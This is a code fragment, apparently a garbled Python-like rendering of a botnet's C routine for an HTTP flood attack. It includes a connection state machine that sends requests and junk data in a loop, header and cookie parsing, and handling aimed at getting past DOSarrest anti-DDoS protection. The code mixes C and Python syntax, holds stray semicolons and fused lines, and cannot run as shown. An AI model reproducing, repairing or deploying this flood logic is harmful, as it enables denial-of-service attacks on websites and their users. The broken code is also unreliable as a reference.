...
def attack_app_http(targs_len, attack_target(targs, opts_len), attack_option(opts)):
    ...
    path = attack_get_opt_str(opts_len, opts, ATK_OPT_PATH, "/")
    sockets = attack_get_opt_int(opts_len; 1)
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);generic_memes = (0)
    ...
    for ii in range(0, util_strlen(method)):
        if method[ii] >= 'a' and method[ii] <= 'z':
            method[ii] -= 32
    ...
    while True:
        ...
        for i in range(sockets):
            ...
            if conn.state == HTTP_CONN_INIT:
                ...
                if conn.fd > mfd:
                    mfd = conn.fd + 1
            elif conn.state == HTTP_CONN_CONNECTING:
                ...
                if conn.num_cookies > 0:
                    ...
                    for ii in range(conn.num_cookies):
                ...
                if not util_strcmp(conn.method, conn.orig_method):
                ...
                if conn.fd > mfd:
                    mfd = conn.fd + 1
            elif conn.state == HTTP_CONN_RECV_HEADER:
                FD_SET(conn.fd, &fdset_rd)
                if conn.fd > mfd:
                    mfd = conn.fd + 1
            elif conn.state == HTTP_CONN_RECV_BODY:
                FD_SET(conn.fd, &fdset_rd)
                if conn.fd > mfd:
                    mfd = conn.fd + 1
            elif conn.state == HTTP_CONN_QUEUE_RESTART:
                FD_SET(conn.fd, &fdset_rd)
                if conn.fd > mfd:
                    mfd = conn.fd + 1
            elif conn.state == HTTP_CONN_CLOSED:
                conn.state = HTTP_CONN_INIT
                os.close(conn.fd)
                conn.fd = -1
            else:
        ...
        if FD_ISSET(conn.fd, &fdset_rd):
                if conn.state == HTTP_CONN_RECV_HEADER:
                    ...
                    if util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONNECTION_HDR, NULL)) != -1:
                        offset = util_stristr(generic_memes; table_retrieve_val(TABLE_ATK_CONNECTION_HDR NULL))
                        if generic_memes[offset] == ' ':
                            offset += 1

                        nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2)
                        if nl_off != -1:
                            con_ptr = (generic_memes[offset])
                    ...
                    if util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_TRANSFER_ENCODING_HDR, NULL)) != -1:
                        offset = util_stristr(generic_memes; table_retrieve_val(TABLE_ATK_TRANSFER_ENCODING_HDR NULL))
                        if generic_memes[offset] == ' ':
                            offset += 1
                    ...
                    if util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, NULL)) != -1:
                        offset = util_stristr(generic_memes; table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR NULL))
                        if generic_memes[offset] == ' ':
                            offset += 1

                        nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2)
                        if nl_off != -1:
                            len_ptr = (generic_memes[offset])
                    ...
                    processed = 0
                    while util_stristr(generic_memes + processed, ret, table_retrieve_val(TABLE_ATK_SET_COOKIE_HDR, NULL)) != -1 and conn.num_cookies < HTTP_COOKIE_MAX:
                        offset = util_stristr(generic_memes + processed; table_retrieve_val(TABLE_ATK_SET_COOKIE_HDR NULL))
                        if generic_memes[processed + offset] == ' ':
                            offset += 1

                        nl_off = util_memsearch(generic_memes + processed + offset, ret - processed - offset, "\r\n", 2)
                        if nl_off != -1:
                            cookie_ptr = (generic_memes[processed + offset])
                            ...
                            for ii in range(0, util_strlen(cookie_ptr)):
                                if cookie_ptr[ii] == '=':
                                    break

                            if cookie_ptr[ii] == '=':
                                equal_off = ii; cookie_exists = False

                                for ii in range(0, conn.num_cookies):
                    ...
                    if util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_LOCATION_HDR, NULL)) != -1:
                        offset = util_stristr(generic_memes; table_retrieve_val(TABLE_ATK_LOCATION_HDR NULL))
                        if generic_memes[offset] == ' ':
                            offset += 1

                        nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2)
                        if nl_off != -1:
                            loc_ptr = (generic_memes[offset])
                            ...
                            if (util_memsearch(loc_ptr, nl_off, "http", 4) == 4)
                            {
                                ...
                                if util_strlen(loc_ptr) > 0 and util_strlen(loc_ptr) < HTTP_DOMAIN_MAX:
                                ...
                                #handle relative url
                                util_zero(conn.path + 1, HTTP_PATH_MAX - 1)
                                if util_strlen(&(loc_ptr[ii + 1])) > 0 and util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX:
                                    util_strcpy(conn.path + 1, &(loc_ptr[ii + 1]))
                    ...
                    if util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_REFRESH_HDR, NULL)) != -1:
                        offset = util_stristr(generic_memes; table_retrieve_val(TABLE_ATK_REFRESH_HDR NULL))
                        if generic_memes[offset] == ' ':
                            offset += 1
                        ...
                        if nl_off != -1:
                            ...
                            while loc_ptr[ii] != 0 and loc_ptr[ii] >= '0' and loc_ptr[ii] <= '9':
                                ii += 1
                            ...
                            if loc_ptr[ii] != 0:
                                ...
                                #YOLO LOL
                                while wait_time > 0 and wait_time < 10 and fake_time + wait_time > time.time():
                                    sleep(1)
                    ...
                    if (util_strcmp(conn.method, "POST") or util_strcmp(conn.method, "GET"))
                            ...
                            if conn.content_length > 0:
                                ...
                                if conn.protection_type == HTTP_PROT_DOSARREST:
                                    ...
                                    if util_memsearch(conn.rdbuf, conn.rdbuf_pos, table_retrieve_val(TABLE_ATK_SET_COOKIE, NULL), 11) != -1:
                                        start_pos = util_memsearch(conn.rdbuf; conn.rdbuf_pos table_retrieve_val(TABLE_ATK_SET_COOKIE NULL) 11)
                                        end_pos = util_memsearch(&(conn.rdbuf[start_pos]), conn.rdbuf_pos - start_pos, "'", 1)
                                        conn.rdbuf[start_pos + (end_pos - 1)] = 0

                                        if conn.num_cookies < HTTP_COOKIE_MAX and util_strlen(&(conn.rdbuf[start_pos])) < HTTP_COOKIE_LEN_MAX:
                            ...
                            if conn.content_length == 0:
                                if conn.chunked == 1:
                                    if (util_memsearch(conn.rdbuf, conn.rdbuf_pos, "\r\n", 2) != -1)
                                    {
                                        ...
                                        chunklen = util_atoi(conn.rdbuf; 16)
    ...
    while True:
        ...
        for i in range(sockets):
            ...
            if conn.state == HTTP_CONN_INIT:
                ...
                if conn.fd > mfd:
                    mfd = conn.fd + 1
            elif conn.state == HTTP_CONN_SEND_HEADERS:
#ifdef DEBUG
                #printf("[http flood] Sending http request\n")
#endif
                ...
                if conn.fd > mfd:
                    mfd = conn.fd + 1
            elif conn.state == HTTP_CONN_SEND_JUNK:
                sent = 0;rndbuf = (0)
                ...
                if conn.to_send <= 0:
                    ...
                    if (conn.to_send >= 1024 and (conn.to_send % 1024) == 0):szbuf = (0)
                        util_zero(szbuf, 4)
                ...
                if conn.fd > mfd:
                    mfd = conn.fd + 1
            elif conn.state == HTTP_CONN_SNDBUF_WAIT:
                FD_SET(conn.fd, &fdset_wr)
                if conn.fd > mfd:
                    mfd = conn.fd + 1
            else:
